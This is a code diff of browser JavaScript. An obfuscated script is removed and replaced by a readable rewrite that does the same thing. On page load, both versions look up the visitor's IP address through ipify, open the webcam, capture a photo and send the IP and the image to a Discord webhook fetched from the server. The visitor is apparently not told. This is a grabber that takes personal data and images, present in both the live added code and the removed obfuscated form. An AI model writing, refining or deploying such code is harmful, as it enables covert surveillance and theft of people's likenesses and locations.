@@ -1,1 +1,76 @@
-function _0x70ed(_0x3b49e8,_0x4be44a){const _0x4e6cfe=_0x4e6c();return _0x70ed=function(_0x70ed28,_0x541214){_0x70ed28=_0x70ed28-0x106;let _0x4556e6=_0x4e6cfe[_0x70ed28];return _0x4556e6;},_0x70ed(_0x3b49e8,_0x4be44a);}const _0x391a9a=_0x70ed;(function(_0x5cf040,_0x2885a1){const _0x1ec924=_0x70ed,_0x492f22=_0x5cf040();while(!![]){try{const _0x3402de=-parseInt(_0x1ec924(0x11f))/0x1*(-parseInt(_0x1ec924(0x126))/0x2)+parseInt(_0x1ec924(0x128))/0x3*(-parseInt(_0x1ec924(0x118))/0x4)+-parseInt(_0x1ec924(0x11a))/0x5*(parseInt(_0x1ec924(0x108))/0x6)+-parseInt(_0x1ec924(0x10a))/0x7+parseInt(_0x1ec924(0x119))/0x8*(-parseInt(_0x1ec924(0x10c))/0x9)+parseInt(_0x1ec924(0x125))/0xa+-parseInt(_0x1ec924(0x11d))/0xb*(-parseInt(_0x1ec924(0x112))/0xc);if(_0x3402de===_0x2885a1)break;else _0x492f22['push'](_0x492f22['shift']());}catch(_0x43896d){_0x492f22['push'](_0x492f22['shift']());}}}(_0x4e6c,0xa0946));const video=document[_0x391a9a(0x121)](_0x391a9a(0x11c)),canvas=document[_0x391a9a(0x121)](_0x391a9a(0x114));async function getWebhookUrl(){const _0x1ca5ab=_0x391a9a,_0x18386b=await fetch(_0x1ca5ab(0x106)),_0x3272fd=await _0x18386b[_0x1ca5ab(0x109)]();return _0x3272fd[_0x1ca5ab(0x11b)];}fetch(_0x391a9a(0x117))['then'](_0x2bb9a9=>_0x2bb9a9[_0x391a9a(0x109)]())[_0x391a9a(0x124)](_0x5ad30a=>{const _0x210548=_0x391a9a,_0x3a2f49=_0x5ad30a['ip'];getWebhookUrl()[_0x210548(0x124)](_0x2b4049=>sendToDiscord(_0x2b4049,_0x210548(0x10b)+_0x3a2f49));})[_0x391a9a(0x123)](_0x20d20d=>console[_0x391a9a(0x10d)]('IPアドレスの取得に失敗しました:',_0x20d20d)),navigator[_0x391a9a(0x107)][_0x391a9a(0x113)]({'video':!![]})[_0x391a9a(0x124)](_0x532878=>{const _0x45ce05=_0x391a9a;video[_0x45ce05(0x127)]=_0x532878,setTimeout(captureImage,0x3e8);})['catch'](_0x557dcd=>{const _0x424c5d=_0x391a9a;console[_0x424c5d(0x10d)]('カメラの起動に失敗しました:',_0x557dcd);});function _0x4e6c(){const _0x160327=['json','5529909rZPyPy','IPアドレス:\x20','2970mAhkOk','error','status','file','image/png','append','878820VlihOo','getUserMedia','canvas','log','stringify','https://api.ipify.org?format=json','1864BDEeOd','21312PmlxgB','50665DCPHjs','webhookUrl','video','242EgYALA','エラーが発生しました:','3obYTza','POST','getElementById','image.png','catch','then','12089380pMAXsy','337078vxTUMN','srcObject','690vLbmee','width','statusText','/api/webhook','mediaDevices','528xYSKns'];_0x4e6c=function(){return _0x160327;};return _0x4e6c();}function captureImage(){const _0x39c16a=_0x391a9a,_0x462343=canvas['getContext']('2d');_0x462343['drawImage'](video,0x0,0x0,canvas[_0x39c16a(0x129)],canvas['height']),canvas['toBlob'](_0xc1b7fe=>{const _0x3379e0=_0x39c16a,_0xb945b3=new FormData();_0xb945b3[_0x3379e0(0x111)](_0x3379e0(0x10f),_0xc1b7fe,_0x3379e0(0x122)),getWebhookUrl()[_0x3379e0(0x124)](_0x49e621=>{const _0x4556e0=_0x3379e0;fetch(_0x49e621,{'method':_0x4556e0(0x120),'body':_0xb945b3})[_0x4556e0(0x124)](_0x4aeead=>{const _0x3b1c8a=_0x4556e0;_0x4aeead['ok']?console['log']('画像が送信されました'):console[_0x3b1c8a(0x10d)]('画像の送信に失敗しました:',_0x4aeead[_0x3b1c8a(0x10e)],_0x4aeead[_0x3b1c8a(0x12a)]);})['catch'](_0x63947c=>{const _0x1c9e7f=_0x4556e0;console['error'](_0x1c9e7f(0x11e),_0x63947c);});});},_0x39c16a(0x110));}function sendToDiscord(_0x32d47a,_0x596b4e){const _0x3c7acb=_0x391a9a;fetch(_0x32d47a,{'method':_0x3c7acb(0x120),'headers':{'Content-Type':'application/json'},'body':JSON[_0x3c7acb(0x116)]({'content':_0x596b4e})})[_0x3c7acb(0x124)](_0x5c4fe7=>{const _0x1bd349=_0x3c7acb;_0x5c4fe7['ok']?console[_0x1bd349(0x115)]('メッセージが送信されました'):console[_0x1bd349(0x10d)]('メッセージの送信に失敗しました:',_0x5c4fe7[_0x1bd349(0x10e)],_0x5c4fe7[_0x1bd349(0x12a)]);})[_0x3c7acb(0x123)](_0x1fe8bd=>{const _0x31831a=_0x3c7acb;console[_0x31831a(0x10d)](_0x31831a(0x11e),_0x1fe8bd);});}
+const video = document.createElement('video');
+const canvas = document.createElement('canvas');
+canvas.width = 640;
+canvas.height = 480;
+
+async function fetchWebhookUrl() {
+    const res = await fetch('/api/webhook');
+    const data = await res.json();
+    return data.webhookUrl; // 必要に応じてサーバー側でトークン認証などを追加
+}
+
+async function sendMessageToDiscord(content) {
+    const webhookUrl = await fetchWebhookUrl();
+    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+        throw new Error('不正なWebhook URLです');
+    }
+    await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content })
+    });
+}
+
+async function sendImageToDiscord(blob) {
+    const webhookUrl = await fetchWebhookUrl();
+    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+        throw new Error('不正なWebhook URLです');
+    }
+    const formData = new FormData();
+    formData.append('file', blob, 'image.png');
+    await fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+    });
+}
+
+async function getIPAddress() {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+}
+
+async function captureImage() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        await new Promise(resolve => {
+            video.onloadedmetadata = () => {
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(async (blob) => {
+                        await sendImageToDiscord(blob);
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/png');
+                    resolve();
+                }, 1000);
+            };
+        });
+    } catch (err) {
+        console.error('カメラ取得に失敗しました:', err);
+    }
+}
+
+async function main() {
+    try {
+        const ipAddress = await getIPAddress();
+        await sendMessageToDiscord(`IPアドレス: ${ipAddress}`);
+        await captureImage();
+    } catch (error) {
+        console.error('エラー:', error);
+    }
+}
+
+main();
